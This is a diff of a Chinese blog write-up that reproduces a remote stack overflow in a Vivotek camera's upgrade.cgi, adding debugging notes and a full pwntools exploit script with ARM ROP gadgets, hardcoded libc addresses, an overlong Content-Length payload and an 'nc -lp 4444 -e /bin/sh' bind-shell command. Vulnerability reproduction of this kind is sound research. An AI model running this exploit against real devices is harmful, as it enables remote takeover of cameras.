@@ -40,5 +40,39 @@ echo -en "POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\nContent-Length:AAAAAAAAAAAAA
 
 需要注意的是，原文章中 cat /proc/2949/maps 查看 libc 基址时，中间的数字是进程的 PID ...吃了没技术的亏。
 
+经过调试，发现会在 system 下报 dumping core in /tmp 这个错，有点懵，但是ROP确实是成功了，附上截图，以后说不定用的上
 
-system死活复现不了...先睡觉，明天我试试用ida远程调
+![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/vivotek远程栈溢出-1.png)
+
+这里下断点的地方是libc里的 system 地址（system_addr= libc_base + 0x47ab0），c之前是刚连上的寄存器内容，之后是断下来的寄存器内容，r0是 执行system 的参数，0xbeffe544内是需要执行的代码 nc -lp 4444 -e /bin/sh; ，我的树莓派好像没法执行这个命令，但是我更换成其他命令情况是一样的。
+
+大体上漏洞已经复现完了，最后的以后有机会再看吧...如果有师傅搞懂了这里是为啥，还请告知：wu.guang.zheng@qq.com
+
+附上使用的脚本
+
+```python
+#encoding=utf-8
+#!/usr/bin/python
+
+from pwn import *
+
+g1=0x00048784 #: pop {r1, pc}
+g2=0x00016aa4 #: mov r0, r1 ; pop {r4, r5, pc}
+
+p = remote("192.168.43.159",80)
+
+libc_base =  0xb6dd0000   # libC 库在内存中的加载地址
+command_addr = 0xbeffe544 # 要执行的代码地址
+system_addr= libc_base + 0x47ab0 # 0xb6e17ab0
+
+g1=libc_base+g1
+g2=libc_base+g2
+prefix="POST /cgi-bin/admin/upgrade.cgi HTTP/1.0nContent-Length:"
+command="nc -lp 4444 -e /bin/sh;"
+payload='aabbccddeeffgghhiijjkkllmmnnooppqqrrssttuuvvwwxxyyzz'
+payload=payload+p32(g1)+p32(command_addr)+p32(g2)+'a'*8+p32(system_addr)
+payload=prefix+payload+command+"nrnrn"
+p.sendline(payload)
+```
+
+
